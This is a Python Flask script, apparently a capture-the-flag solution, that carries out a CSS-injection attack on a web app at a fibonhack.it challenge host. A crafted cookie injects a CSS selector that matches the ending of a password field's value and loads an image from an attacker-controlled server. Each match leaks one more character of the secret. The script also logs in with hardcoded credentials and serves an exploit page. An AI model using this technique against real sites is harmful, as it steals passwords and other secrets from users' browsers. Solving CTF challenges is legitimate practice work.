from flask import Flask, request
import base64
import json
import requests

app = Flask(__name__)
s = None

characterset = 'rsabcdefghijklmnopqtuvwxyz0123456789_{}'
flag_up_to_now = '}'
current_character = 0

def make_cookie(c):
    return base64.b64encode(json.dumps({
        "kebab":"""pink;} input[type="password"][value$="%s"]{background-image:url("http://[REDACTED]/hit?c=%s")""" % (c+flag_up_to_now, c)
    }).encode()).decode()

@app.route('/')
def index():
    print("Downloading page")
    with open('pwn.html', 'r') as f:
        return f.read()


@app.route('/place_cookie')
def place_cookie():
    global current_character
    c = characterset[current_character]
    print(f"Trying with {c + flag_up_to_now}")
    r = s.get("http://to.just-l33t.fibonhack.it/api/cookie_bridge?to=en", cookies={
        "colors": make_cookie(c),
    },
    allow_redirects=False)

    token = r.headers['Location'].split('token=')[1]
    
    print(f"Token: {token}")

    current_character += 1

    return token


@app.route('/hit')
def hit():
    global flag_up_to_now, current_character

    c = request.args.get('c')
    print(f'Hit: {c}')
    flag_up_to_now = c + flag_up_to_now
    current_character = 0
    return 'OK'

if __name__ == '__main__':
    s = requests.session()
    r = s.post("http://to.just-l33t.fibonhack.it/api/login", json={"username": "elkeke69", "password": "42e13cae5bafb7cd5166d99d0095126e"})
    app.run(port=8090, host='0.0.0.0')